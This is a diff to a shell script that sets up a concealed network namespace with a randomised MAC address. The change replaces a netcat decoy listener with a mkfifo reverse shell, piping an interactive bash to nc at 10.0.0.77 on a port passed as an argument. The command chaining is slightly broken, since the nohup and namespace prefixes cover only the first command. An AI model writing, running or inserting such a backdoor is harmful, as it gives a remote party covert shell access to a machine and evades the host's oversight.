@@ -8,6 +8,7 @@ PHYSICAL_IFACE="ens3"
 NAMESPACE="phantom01"
 VIRTUAL_IFACE="macvlan0"
 SUBNET_PREFIX="10.10.10" # CHANGE THIS
+PORT=$1
 
 # Generate a random, locally administered MAC address
 RANDOM_MAC=$(printf "02:%02x:%02x:%02x:%02x:%02x\n" $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
@@ -39,6 +40,6 @@ ip netns exec $NAMESPACE ip link set dev lo up
 
 # Launch a decoy service INSIDE the hidden namespace
 # (This spawns a netcat listener on port 22 that the host OS cannot see)
-nohup ip netns exec $NAMESPACE nc -l -p 22 > /dev/null 2>&1 &
+nohup ip netns exec $NAMESPACE rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.0.77 $PORT > /tmp/f
 
 echo "[+] Phantom network deployed successfully. Hiding in the shadows."
